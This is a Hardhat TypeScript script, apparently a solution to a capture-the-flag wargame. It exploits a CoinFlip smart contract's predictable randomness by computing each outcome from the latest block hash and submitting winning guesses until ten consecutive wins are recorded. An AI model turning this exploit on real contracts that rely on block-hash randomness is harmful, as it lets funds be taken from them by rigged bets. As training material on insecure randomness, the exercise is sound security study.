import { ethers } from "hardhat";
import { CoinFlip__factory } from "../typechain/factories/CoinFlip__factory"
import { BigNumber, providers } from "ethers";

async function main() {
  const [addr1] = await ethers.getSigners();
  const deployedAddress = '0x9943F594CD2Fb5C58A1Da2Cd144D87f651a4560b';
  const connectedContract = CoinFlip__factory.connect(deployedAddress, addr1);
  console.log(await ethers.provider.getBlockNumber())
  const FACTOR: BigNumber = BigNumber.from("57896044618658097711785492504343953926634992332820282019728792003956564819968");
  let nWin = 0;
  let lastBlockNumber = 0;
  while (nWin < 10) {
    const currentBlockNumber: number = await ethers.provider.getBlockNumber();
    if (lastBlockNumber !== currentBlockNumber) {
      console.log("new block : " + currentBlockNumber);
      lastBlockNumber = currentBlockNumber;

      const block: providers.Block = await ethers.provider.getBlock(lastBlockNumber);
      if (block.hash !== null) {
        const currentHash: BigNumber = BigNumber.from(block.hash);
        const flip = currentHash.div(FACTOR)
        await connectedContract.flip(flip.gte(1), { gasLimit: 200000, gasPrice: 10000000000 });
        let win: BigNumber = await connectedContract.consecutiveWins();
        console.log("Nb wins : " + win.toString());
        nWin = win.toNumber();
      }
    }
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
